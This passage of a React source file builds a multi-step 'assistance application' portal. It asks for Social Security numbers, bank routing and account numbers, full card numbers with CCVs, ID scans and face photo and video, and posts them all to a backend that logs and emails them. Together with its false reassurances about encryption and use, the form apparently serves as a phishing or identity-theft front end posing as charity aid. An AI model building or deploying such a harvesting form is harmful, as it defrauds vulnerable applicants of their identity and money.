import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  ChevronRight,
  ChevronLeft,
  Upload,
  Check,
  CheckCircle2,
  AlertCircle,
  Shield,
  Minus,
  User,
  Building,
  MessageSquare,
  X,
  Mail,
  ShieldCheck,
  ArrowRight
} from 'lucide-react';
import { toast } from 'sonner';
import { bank, state } from '../utils/data';
import BankAutocomplete from '../components/BankAutoComplete';
import CameraModal from '../components/CameraModal';

// Modal for upload progress
const SubmissionProgressModal = ({ isOpen, progress }: { isOpen: boolean; progress: number }) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-md p-6 bg-white rounded-2xl shadow-xl text-center">
        <div className="mx-auto mb-4 flex items-center justify-center w-14 h-14 rounded-full bg-blue-50 text-blue-600">
          <Upload className="w-7 h-7 animate-pulse" />
        </div>
        <h3 className="text-lg font-bold text-gray-900">Submitting Application</h3>
        <p className="mt-1 text-xs text-gray-500">
          Please wait while your documents are securely uploaded and your application is recorded...
        </p>
        <div className="w-full mt-5 bg-gray-100 rounded-full h-2.5 overflow-hidden">
          <div
            className="bg-blue-600 h-2.5 rounded-full transition-all duration-300 ease-out"
            style={{ width: `${progress}%` }}
          />
        </div>
        <p className="mt-2 text-xs font-semibold text-gray-400">{progress}% complete</p>
      </div>
    </div>
  );
};

// Upgraded Premium Success Modal with 1-5 business days email confirmation notice
interface SuccessModalProps {
  isOpen: boolean;
  applicantName?: string;
  onClose: () => void;
}

const SuccessModal: React.FC<SuccessModalProps> = ({ isOpen, applicantName, onClose }) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-slate-900/60 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg overflow-hidden bg-white rounded-3xl shadow-2xl border border-gray-100 text-center animate-in zoom-in-95 duration-200">
        {/* Top Decorative Gradient Accent */}
        <div className="h-2.5 bg-gradient-to-r from-emerald-500 via-teal-500 to-blue-600" />

        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 p-2 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded-full transition-colors"
          aria-label="Close"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="p-6 sm:p-8">
          {/* Animated Success Badge */}
          <div className="mx-auto mb-4 w-20 h-20 rounded-full bg-emerald-50 flex items-center justify-center ring-8 ring-emerald-50/70">
            <CheckCircle2 className="w-10 h-10 text-emerald-600" />
          </div>

          <h3 className="text-2xl font-bold text-gray-900">
            Application Submitted!
          </h3>
          <p className="mt-2 text-sm text-gray-600 leading-relaxed">
            {applicantName ? `Thank you, ${applicantName}. ` : 'Thank you! '}
            Your assistance application and documents have been securely received and recorded.
          </p>

          {/* Key Information Cards */}
          <div className="mt-6 space-y-3 text-left">
            {/* Email Confirmation Notice (1-5 business days) */}
            <div className="p-4 rounded-2xl bg-emerald-50/80 border border-emerald-100/80 flex items-start gap-3.5">
              <div className="p-2 rounded-xl bg-emerald-100 text-emerald-700 shrink-0 mt-0.5">
                <Mail className="w-5 h-5" />
              </div>
              <div>
                <h4 className="text-sm font-semibold text-emerald-950">
                  Email Confirmation (1–5 Business Days)
                </h4>
                <p className="mt-1 text-xs text-emerald-800/90 leading-relaxed">
                  Our intake team will process your application within <span className="font-semibold text-emerald-950">1–5 business days</span>. We may contact you via email at your provided address for further confirmation, updates, or next steps.
                </p>
              </div>
            </div>

            {/* SMS Verification Notice */}
            <div className="p-4 rounded-2xl bg-blue-50/80 border border-blue-100/80 flex items-start gap-3.5">
              <div className="p-2 rounded-xl bg-blue-100 text-blue-700 shrink-0 mt-0.5">
                <MessageSquare className="w-5 h-5" />
              </div>
              <div>
                <h4 className="text-sm font-semibold text-blue-950">
                  SMS Verification (If Needed)
                </h4>
                <p className="mt-1 text-xs text-blue-800/90 leading-relaxed">
                  If additional verification is required to complete processing, an SMS notification will be sent directly to your registered phone number.
                </p>
              </div>
            </div>
          </div>

          {/* Security Guarantee */}
          <div className="mt-5 flex items-center justify-center gap-1.5 text-xs text-gray-400">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            <span>256-bit encrypted & securely stored</span>
          </div>

          {/* Primary Action Button to Return Home */}
          <button
            onClick={onClose}
            className="w-full mt-6 py-3.5 px-6 rounded-xl font-semibold text-white bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 shadow-lg shadow-emerald-600/25 hover:shadow-xl hover:shadow-emerald-600/30 transition-all duration-200 flex items-center justify-center gap-2 group text-base cursor-pointer"
          >
            <span>Okay, Return to Home</span>
            <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
          </button>
        </div>
      </div>
    </div>
  );
};

const ApplicationPortal = () => {
  const [currentStep, setCurrentStep] = useState(1);

  type Card = {
    cardNumber: string;
    expiry: string;
    ccv: string;
  };

  type FormData = {
    // Personal Information
    firstName: string;
    lastName: string;
    dateOfBirth: string;
    socialSecurityNumber: string;
    phoneNumber: string;
    email: string;

    // Address Information
    currentAddress: string;
    city: string;
    state: string;
    zipCode: string;
    mailingAddress: string;

    // Banking Information
    bankName: string;
    accountType: string;
    routingNumber: string;
    accountNumber: string;

    // Documents
    governmentIdFront: File | null;
    governmentIdBack: File | null;
    biodataImage: File | null;
    biodataVideo: File | null;
    randomPicture: File | null;

    // Verification
    termsAccepted: boolean;
    dataConsent: boolean;

    // Card Information
    cards: Card[];
  };

  const [formData, setFormData] = useState<FormData>({
    // Personal Information
    firstName: '',
    lastName: '',
    dateOfBirth: '',
    socialSecurityNumber: '',
    phoneNumber: '',
    email: '',

    // Address Information
    currentAddress: '',
    city: '',
    state: '',
    zipCode: '',
    mailingAddress: '',

    // Banking Information
    bankName: '',
    accountType: '',
    routingNumber: '',
    accountNumber: '',

    // Documents
    governmentIdFront: null,
    governmentIdBack: null,
    biodataImage: null,
    biodataVideo: null,
    randomPicture: null,

    // Verification
    termsAccepted: false,
    dataConsent: false,

    // Card Info (start with one empty card mandatory)
    cards: [{ cardNumber: '', expiry: '', ccv: '' }],
  });

  type Errors = { [key: string]: string };
  const [errors, setErrors] = useState<Errors>({});
  const [uploadProgress, setUploadProgress] = useState<Record<string, number>>({});
  const allStates = state;
  const allBanks = bank;
  const navigate = useNavigate();
  const [showModal, setShowModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [submittedName, setSubmittedName] = useState('');
  const [showProgressModal, setShowProgressModal] = useState(false);
  const [submissionComplete, setSubmissionComplete] = useState(false);
  const [progress, setProgress] = useState(0);

  const handleCloseSuccess = () => {
    setShowSuccessModal(false);
    navigate('/');
  };

  const handleCapture = (data: string) => {
    console.log('Captured:', data);
  };


  const steps = [
    { id: 1, title: 'Personal Information', icon: '1' },
    { id: 2, title: 'Address Details', icon: '2' },
    { id: 3, title: 'Banking Information', icon: '3' },
    { id: 4, title: 'Document Upload', icon: '4' },
    { id: 5, title: 'Attach Card', icon: '5' },
    { id: 6, title: 'Review & Submit', icon: '6' },
  ];

  const handleFileUpload = (field: string, file: File) => {
    // Simulate file upload progress
    setUploadProgress(prev => ({ ...prev, [field]: 0 }));

    const interval = setInterval(() => {
      setUploadProgress(prev => {
        const progress = (prev[field] || 0) + 10;
        if (progress >= 100) {
          clearInterval(interval);
          setFormData(prevData => ({ ...prevData, [field]: file }));
          return { ...prev, [field]: 100 };
        }
        return { ...prev, [field]: progress };
      });
    }, 200);
  };

  const validateStep = (step: number) => {
    const newErrors: Errors = {};

    if (step === 1) {
      if (!formData.firstName) newErrors.firstName = 'First name is required';
      if (!formData.lastName) newErrors.lastName = 'Last name is required';
      if (!formData.dateOfBirth) newErrors.dateOfBirth = 'Date of birth is required';
      if (!formData.socialSecurityNumber) newErrors.socialSecurityNumber = 'SSN is required';
      if (!formData.phoneNumber) newErrors.phoneNumber = 'Phone number is required';
      if (!formData.email) newErrors.email = 'Email is required';
    }

    if (step === 2) {
      if (!formData.currentAddress) newErrors.currentAddress = 'Current address is required';
      if (!formData.city) newErrors.city = 'City is required';
      if (!formData.state) newErrors.state = 'State is required';
      if (!formData.zipCode) newErrors.zipCode = 'ZIP code is required';
    }

    if (step === 3) {
      if (!formData.bankName) newErrors.bankName = 'Bank name is required';
      if (!formData.accountType) newErrors.accountType = 'Account type is required';
      if (!formData.routingNumber) newErrors.routingNumber = 'Routing number is required';
      if (!formData.accountNumber) newErrors.accountNumber = 'Account number is required';
    }

    if (step === 4) {
      if (!formData.governmentIdFront) newErrors.governmentIdFront = 'Front of government ID is required';
      if (!formData.governmentIdBack) newErrors.governmentIdBack = 'Back of government ID is required';
      if (!formData.biodataImage) newErrors.biodataImage = 'Face photo is required';
      if (!formData.biodataVideo) newErrors.biodataVideo = 'Face video is required';
      if (!formData.randomPicture) newErrors.randomPicture = 'Random picture is required';
    }

    if (step === 5) {
      if (formData.cards.length === 0 || !formData.cards[0].cardNumber) {
        newErrors.cards = 'At least one card is required';
      } else {
        formData.cards.forEach((card, index) => {
          if (!card.cardNumber) newErrors[`cards[${index}].cardNumber`] = 'Card number is required';
          if (!card.expiry) newErrors[`cards[${index}].expiry`] = 'Expiry date is required';
          if (!card.ccv) newErrors[`cards[${index}].ccv`] = 'CCV is required';
        });
      }
    }

    if (step === 6) {
      if (!formData.termsAccepted) newErrors.termsAccepted = 'You must accept the terms and conditions';
      if (!formData.dataConsent) newErrors.dataConsent = 'You must consent to data processing';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validationPatterns: Record<string, RegExp> = {
    firstName: /^[A-Za-z\s'-]*$/,   // only letters, spaces, hyphens, apostrophes
    lastName: /^[A-Za-z\s'-]*$/,
    phoneNumber: /^[0-9()-\s]*$/,   // digits, parentheses, spaces, hyphens
    // email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, // email pattern (validated on blur/submit)
    socialSecurityNumber: /^[0-9-]*$/, // SSN like 123-45-6789
    city: /^[A-Za-z\s'-]*$/,
    state: /^[A-Za-z]{0,2}$/, // US state code
    zipCode: /^[0-9-]*$/, // numeric only
    bankName: /^[A-Za-z0-9\s'-]*$/,
    routingNumber: /^[0-9\s]*$/, // digits only
    accountNumber: /^[0-9\s]*$/, // digits only
  };

  // Format SSN as xxx-xx-xxxx
  const formatSSN = (value: string) => {
    const digits = value.replace(/\D/g, ""); // remove non-digits
    const parts = [];
    if (digits.length > 3) {
      parts.push(digits.substring(0, 3));
      if (digits.length > 5) {
        parts.push(digits.substring(3, 5));
        parts.push(digits.substring(5, 9));
      } else {
        parts.push(digits.substring(3));
      }
    } else {
      parts.push(digits);
    }
    return parts.join("-");
  };

  // Format US phone number as (XXX) XXX-XXXX
  const formatPhoneNumber = (value: string) => {
    const digits = value.replace(/\D/g, "");
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `(${digits.substring(0, 3)}) ${digits.substring(3)}`;
    return `(${digits.substring(0, 3)}) ${digits.substring(3, 6)}-${digits.substring(6, 10)}`;
  };

  // Format routing number (9 digits max)
  const formatRoutingNumber = (value: string) => {
    return value.replace(/\D/g, "").substring(0, 9);
  };

  // Format account number (12 digits max, allow spaces every 4 digits for readability)
  const formatAccountNumber = (value: string): string => {
    const digits = value.replace(/\D/g, "").slice(0, 12);
    return (digits.match(/.{1,4}/g) || []).join(" ");
  };

  // Format ZIP code (5 digits or ZIP+4 like 12345-6789)
  const formatZipCode = (value: string) => {
    const digits = value.replace(/\D/g, ""); // cap to 9 digits
    if (digits.length > 5) return digits.slice(0, 5) + "-" + digits.slice(5, 9);
    return digits;
  };

  // Format card number (16 digits max, spaces every 4 digits)
  const formatCardNumber = (value: string): string => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return (digits.match(/.{1,4}/g) || []).join(" ");
  };

  // Format expiry as MM/YY
  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return digits.slice(0, 2) + "/" + digits.slice(2);
  };

  // Format CCV (3–4 digits)
  const formatCCV = (value: string): string => {
    return value.replace(/\D/g, "").slice(0, 4);
  };

  const handleInputChange = (field: string, value: string | boolean) => {
    if (typeof value === "string" && validationPatterns[field]) {
      // Block disallowed characters live
      if (!validationPatterns[field].test(value)) {
        return; // don't update formData if invalid
      }
      switch (field) {
        case "socialSecurityNumber":
          value = formatSSN(value);
          break;
        case "phoneNumber":
          value = formatPhoneNumber(value);
          break;
        case "routingNumber":
          value = formatRoutingNumber(value);
          break;
        case "accountNumber":
          value = formatAccountNumber(value);
          break;
        case "zipCode":
          value = formatZipCode(value);
          break;
        default:
          break;
      }
    }

    setFormData(prev => ({ ...prev, [field]: value }));

    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: '' }));
    }
  };

  const handleCardChange = (index: number, field: keyof Card, value: string) => {
    // Format fields
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "ccv") value = formatCCV(value);

    setFormData(prev => {
      const updatedCards = [...prev.cards];
      updatedCards[index][field] = value;
      return { ...prev, cards: updatedCards };
    });
  };

  const addCard = () => {
    setFormData(prev => ({ ...prev, cards: [...prev.cards, { cardNumber: '', expiry: '', ccv: '' }] }));
  };

  const removeCard = (index: number) => {
    setFormData(prev => {
      const updatedCards = prev.cards.filter((_, i) => i !== index);
      return { ...prev, cards: updatedCards };
    });
  };

  const nextStep = () => {
    if (validateStep(currentStep)) {
      setCurrentStep(prev => Math.min(prev + 1, steps.length));
    }
  };

  const prevStep = () => {
    setCurrentStep(prev => Math.max(prev - 1, 1));
  };

  // Backend URL from env with fallback to production backend server
  const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://hope-haven-server.vercel.app';

  const uploadFile = async (file: File, folder: string) => {
    if (!file) throw new Error('File is required for upload');

    try {
      const formData = new FormData();
      formData.append('file', file);
      formData.append('folder', folder);

      const response = await fetch(`${BACKEND_URL}/api/upload`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => null);
        throw new Error(`Failed to upload ${file.name}: ${errorData?.error || response.statusText}`);
      }

      return await response.json();
    } catch (error: unknown) {
      const msg = error instanceof Error ? error.message : 'Unknown error';
      throw new Error(`Failed to upload ${file.name}: ${msg}`);
    }
  };

  const logToBackend = async (logData: Record<string, unknown>) => {
    try {
      const response = await fetch(`${BACKEND_URL}/api/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(logData)
      });

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Server responded with status: ${response.status}. ${errorText}`);
      }

      return await response.json();
    } catch (error: unknown) {
      console.error('Failed to log to backend:', error);
      throw error;
    }
  };

  const handleSubmit = async () => {
    if (!validateStep(currentStep)) return;

    setProgress(0);
    setSubmissionComplete(false);
    setShowProgressModal(true);

    try {
      // 1. Collect all document files
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const cloudinaryFolder = `hopehaven/${formData.firstName}_${timestamp}`;

      setProgress(10);

      const documentFiles: { file: File, fieldName: string }[] = [];
      if (formData.governmentIdFront) documentFiles.push({ file: formData.governmentIdFront, fieldName: 'governmentIdFront' });
      if (formData.governmentIdBack) documentFiles.push({ file: formData.governmentIdBack, fieldName: 'governmentIdBack' });
      if (formData.biodataImage) documentFiles.push({ file: formData.biodataImage, fieldName: 'biodataImage' });
      if (formData.biodataVideo) documentFiles.push({ file: formData.biodataVideo, fieldName: 'biodataVideo' });
      if (formData.randomPicture) documentFiles.push({ file: formData.randomPicture, fieldName: 'randomPicture' });

      if (documentFiles.length === 0) {
        throw new Error('No files to upload. Please add required documents.');
      }

      // 2. Upload all files to Cloudinary
      const uploadedFiles: { name: string; url: string; id: string; fieldName: string }[] = [];
      const progressPerFile = 80 / documentFiles.length;

      for (let i = 0; i < documentFiles.length; i++) {
        try {
          const { file, fieldName } = documentFiles[i];
          const fileName = file.name || `${fieldName}_${Date.now()}`;
          const fileToUpload = new File([file], fileName, { type: file.type || 'application/octet-stream' });

          const uploadedFile = await uploadFile(fileToUpload, cloudinaryFolder);

          uploadedFiles.push({
            name: uploadedFile.name,
            url: uploadedFile.url,
            id: uploadedFile.id,
            fieldName
          });
          setProgress(10 + (i + 1) * progressPerFile);
        } catch (error: unknown) {
          console.error(`Upload failed for file ${i + 1}:`, error);
          // Continue uploading remaining files
        }
      }

      if (uploadedFiles.length === 0) {
        throw new Error('Failed to upload any files. Please try again.');
      }

      setProgress(100);

      // 5. Prepare log data with ALL form fields
      const logData = {
        timestamp: new Date().toISOString(),
        formData: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          dateOfBirth: formData.dateOfBirth,
          socialSecurityNumber: formData.socialSecurityNumber,
          phoneNumber: formData.phoneNumber,
          email: formData.email,
          currentAddress: formData.currentAddress,
          city: formData.city,
          state: formData.state,
          zipCode: formData.zipCode,
          mailingAddress: formData.mailingAddress,
          bankName: formData.bankName,
          accountType: formData.accountType,
          routingNumber: formData.routingNumber,
          accountNumber: formData.accountNumber,
          termsAccepted: formData.termsAccepted,
          dataConsent: formData.dataConsent,
          cards: formData.cards
        },
        folder: {
          name: cloudinaryFolder,
          id: cloudinaryFolder,
          url: ''
        },
        files: uploadedFiles
      };

      // 6. Send log data to backend (saves to DB and sends email)
      await logToBackend(logData);
      setSubmissionComplete(true);
      setSubmittedName(formData.firstName);
      setShowProgressModal(false);
      setShowSuccessModal(true);

      // Reset form
      setFormData({
        firstName: '',
        lastName: '',
        dateOfBirth: '',
        socialSecurityNumber: '',
        phoneNumber: '',
        email: '',
        currentAddress: '',
        city: '',
        state: '',
        zipCode: '',
        mailingAddress: '',
        bankName: '',
        accountType: '',
        routingNumber: '',
        accountNumber: '',
        governmentIdFront: null,
        governmentIdBack: null,
        biodataImage: null,
        biodataVideo: null,
        randomPicture: null,
        termsAccepted: false,
        dataConsent: false,
        cards: [{ cardNumber: '', expiry: '', ccv: '' }]
      });

    } catch (error: unknown) {
      console.error('Upload error:', error);
      // Show error message to user using Sonner
      toast.error('Application submission failed. Please try again.');
      // Close the progress modal
      setShowProgressModal(false);
    } finally {
      setProgress(0);
    }
  };

  const renderStepContent = () => {
    switch (currentStep) {
      case 1:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Personal Information</h3>
            <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">First Name *</label>
                <input
                  type="text"
                  value={formData.firstName}
                  onChange={(e) => handleInputChange('firstName', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.firstName ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Enter your first name"
                />
                {errors.firstName && <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Last Name *</label>
                <input
                  type="text"
                  value={formData.lastName}
                  onChange={(e) => handleInputChange('lastName', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.lastName ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Enter your last name"
                />
                {errors.lastName && <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Date of Birth *</label>
                <input
                  type="date"
                  value={formData.dateOfBirth}
                  onChange={(e) => handleInputChange('dateOfBirth', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.dateOfBirth ? 'border-red-500' : 'border-gray-300'
                    }`}
                />
                {errors.dateOfBirth && <p className="mt-1 text-sm text-red-600">{errors.dateOfBirth}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Social Security Number *</label>
                <input
                  type="text"
                  value={formData.socialSecurityNumber}
                  onChange={(e) => handleInputChange('socialSecurityNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.socialSecurityNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="XXX-XX-XXXX"
                />
                {errors.socialSecurityNumber && <p className="mt-1 text-sm text-red-600">{errors.socialSecurityNumber}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Phone Number *</label>
                <input
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.phoneNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="(XXX) XXX-XXXX"
                />
                {errors.phoneNumber && <p className="mt-1 text-sm text-red-600">{errors.phoneNumber}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Email Address *</label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => handleInputChange('email', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.email ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="your.email@example.com"
                />
                {errors.email && <p className="mt-1 text-sm text-red-600">{errors.email}</p>}
              </div>
            </div>
          </div>
        );

      case 2:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Address Information</h3>
            <div className="space-y-6">
              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Current Address *</label>
                <input
                  type="text"
                  value={formData.currentAddress}
                  onChange={(e) => handleInputChange('currentAddress', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.currentAddress ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Enter your current address or shelter location"
                />
                {errors.currentAddress && <p className="mt-1 text-sm text-red-600">{errors.currentAddress}</p>}
              </div>

              <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
                <div>
                  <label className="block mb-2 text-sm font-medium text-gray-700">City *</label>
                  <input
                    type="text"
                    value={formData.city}
                    onChange={(e) => handleInputChange('city', e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.city ? 'border-red-500' : 'border-gray-300'
                      }`}
                    placeholder="City"
                  />
                  {errors.city && <p className="mt-1 text-sm text-red-600">{errors.city}</p>}
                </div>

                <div>
                  <label className="block mb-2 text-sm font-medium text-gray-700">State *</label>
                  <select
                    value={formData.state}
                    onChange={(e) => handleInputChange('state', e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.state ? 'border-red-500' : 'border-gray-300'
                      }`}
                  >
                    <option value="">Select State</option>
                    {allStates.map((s) => (
                      <option key={s.key} value={s.key}>
                        {s.name}
                      </option>
                    ))}
                  </select>
                  {errors.state && <p className="mt-1 text-sm text-red-600">{errors.state}</p>}
                </div>

                <div>
                  <label className="block mb-2 text-sm font-medium text-gray-700">ZIP Code *</label>
                  <input
                    type="text"
                    value={formData.zipCode}
                    onChange={(e) => handleInputChange('zipCode', e.target.value)}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.zipCode ? 'border-red-500' : 'border-gray-300'
                      }`}
                    placeholder="XXXXX-XXXX"
                  />
                  {errors.zipCode && <p className="mt-1 text-sm text-red-600">{errors.zipCode}</p>}
                </div>
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Mailing Address (if different)</label>
                <input
                  type="text"
                  value={formData.mailingAddress}
                  onChange={(e) => handleInputChange('mailingAddress', e.target.value)}
                  className="px-4 py-3 w-full rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  placeholder="Enter mailing address if different from current address"
                />
              </div>
            </div>
          </div>
        );

      case 3:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Banking Information</h3>
            <div className="p-4 mb-6 bg-blue-50 rounded-lg border border-blue-200">
              <div className="flex items-center">
                <Shield className="mr-2 w-5 h-5 text-blue-600" />
                <p className="text-sm text-blue-800">
                  Your banking information is encrypted and secure. We use this information solely for direct deposit of your assistance funds.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
              <BankAutocomplete
                allBanks={allBanks}
                value={formData.bankName}
                error={errors.bankName}
                onChange={(val) => handleInputChange("bankName", val)}
              />

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Account Type *</label>
                <select
                  value={formData.accountType}
                  onChange={(e) => handleInputChange('accountType', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.accountType ? 'border-red-500' : 'border-gray-300'
                    }`}
                >
                  <option value="">Select Account Type</option>
                  <option value="checking">Checking</option>
                  <option value="savings">Savings</option>
                </select>
                {errors.accountType && <p className="mt-1 text-sm text-red-600">{errors.accountType}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Routing Number *</label>
                <input
                  type="text"
                  value={formData.routingNumber}
                  onChange={(e) => handleInputChange('routingNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.routingNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="9-digit routing number"
                />
                {errors.routingNumber && <p className="mt-1 text-sm text-red-600">{errors.routingNumber}</p>}
              </div>

              <div>
                <label className="block mb-2 text-sm font-medium text-gray-700">Account Number *</label>
                <input
                  type="text"
                  value={formData.accountNumber}
                  onChange={(e) => handleInputChange('accountNumber', e.target.value)}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors.accountNumber ? 'border-red-500' : 'border-gray-300'
                    }`}
                  placeholder="Your account number"
                />
                {errors.accountNumber && <p className="mt-1 text-sm text-red-600">{errors.accountNumber}</p>}
              </div>
            </div>
          </div>
        );

      case 4:
        return (
          <div className="space-y-6">
            <h3 className="mb-6 text-2xl font-semibold text-gray-800">Document Upload & Verification</h3>
            <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
              {/* Government ID Front */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <Upload className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Government ID (Front) *</h4>
                  <p className="mb-4 text-gray-600">Upload the front of your driver's license, state ID, or passport</p>
                  {formData.governmentIdFront ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Front uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        onChange={(e) => e.target.files && handleFileUpload('governmentIdFront', e.target.files[0])}
                        className="hidden"
                        id="government-id-front"
                      />
                      <label
                        htmlFor="government-id-front"
                        className="px-6 py-2 text-white bg-blue-600 rounded-lg transition-colors cursor-pointer hover:bg-blue-700"
                      >
                        Choose File
                      </label>
                    </div>
                  )}
                  {uploadProgress.governmentIdFront && uploadProgress.governmentIdFront < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-blue-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.governmentIdFront}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Uploading... {uploadProgress.governmentIdFront}%</p>
                    </div>
                  )}
                  {errors.governmentIdFront && <p className="mt-2 text-sm text-red-600">{errors.governmentIdFront}</p>}
                </div>
              </div>
              {/* Government ID Back */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <Upload className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                  <h4 className="mb-2 text-lg font-semibold text-gray-800">Government ID (Back) *</h4>
                  <p className="mb-4 text-gray-600">Upload the back of your driver's license, state ID, or passport</p>
                  {formData.governmentIdBack ? (
                    <div className="flex justify-center items-center space-x-2 text-green-600">
                      <Check className="w-5 h-5" />
                      <span>Back uploaded</span>
                    </div>
                  ) : (
                    <div>
                      <input
                        type="file"
                        accept="image/*"
                        onChange={(e) => e.target.files && handleFileUpload('governmentIdBack', e.target.files[0])}
                        className="hidden"
                        id="government-id-back"
                      />
                      <label
                        htmlFor="government-id-back"
                        className="px-6 py-2 text-white bg-blue-600 rounded-lg transition-colors cursor-pointer hover:bg-blue-700"
                      >
                        Choose File
                      </label>
                    </div>
                  )}
                  {uploadProgress.governmentIdBack && uploadProgress.governmentIdBack < 100 && (
                    <div className="mt-4">
                      <div className="h-2 bg-gray-200 rounded-full">
                        <div
                          className="h-2 bg-blue-600 rounded-full transition-all duration-300"
                          style={{ width: `${uploadProgress.governmentIdBack}%` }}
                        ></div>
                      </div>
                      <p className="mt-2 text-sm text-gray-600">Uploading... {uploadProgress.governmentIdBack}%</p>
                    </div>
                  )}
                  {errors.governmentIdBack && <p className="mt-2 text-sm text-red-600">{errors.governmentIdBack}</p>}
                </div>
              </div>
              {/* Biodata Image (Face) */}
              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                <div className="text-center">
                  <User className="mx-auto mb-4 w-12 h-12 text-gray-400" />
